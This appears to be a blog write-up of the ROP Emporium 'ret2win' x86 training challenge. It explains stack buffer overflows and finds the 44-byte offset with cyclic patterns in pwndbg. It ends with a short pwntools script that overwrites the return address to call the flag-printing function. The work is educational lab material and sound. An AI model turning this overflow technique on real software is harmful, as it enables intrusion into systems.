---
layout: post
title: "ROP Emporium: ret2win (x86)"
date: 2026-04-13
---

## Challenge

We are given a binary that contains a `ret2win()` function — executing 
it will print the flag. The binary has a stack based buffer overflow 
vulnerability which we can use to overwrite the return address and 
redirect execution to `ret2win()`.

## How Stack Based Buffer Overflows Work

```
HIGH ADDRESS
┌─────────────────────┐
│    return address   │
├─────────────────────┤
│    saved EBP        │
├─────────────────────┤
│                     │
│    buffer[64]       │
│                     │
└─────────────────────┘
LOW ADDRESS
```

When a function is called the CPU saves the return address on the stack 
so it knows where to go back to when finished. If you write more data 
than the buffer can hold you overwrite that return address. So when the 
function returns it jumps to wherever you tell it instead.

Our goal is to overwrite the return address with the address of `ret2win()`.

## Approach

**Step 1 — Initial recon**

First lets run the binary and see what happens with some input.

![recon](/assets/images/2026-04-10/recon.png)

We get `Thank you!` and `Exiting` — not the flag. We need to redirect 
execution to `ret2win()`.

**Step 2 — Finding the offset and ret2win() address**

First lets find the address of `ret2win()` using `info functions` in pwndbg.

![functions](/assets/images/2026-04-10/functions.png)

The address is `0x0804862c`.

Next we find the offset using `cyclic 100` to generate a unique pattern 
and run the binary with it as input.

![cyclic](/assets/images/2026-04-10/cyclic.png)

We get a segfault — always a good sign. Running `cyclic -l 0x6161616c` 
with the value from EIP gives us the offset of 44 bytes.

**Step 3 — Building the exploit**

```python
from pwn import *

p = process("./ret2win32")

offset = 44
ret2win = 0x0804862c

payload  = b'A' * offset
payload += p32(ret2win)

p.sendline(payload)
p.interactive()
```

## Solution

Sending 44 bytes of junk followed by the address of `ret2win()` overwrites 
the return address and redirects execution to print the flag.

![flag](/assets/images/2026-04-10/flag.png)

Flag: `ROPE{a_placeholder_32byte_flag!}`

## What I learned

- How to find a function address with `info functions` in pwndbg
- How to find the offset to the return address using cyclic patterns
- How to build a basic ret2win exploit with pwntools
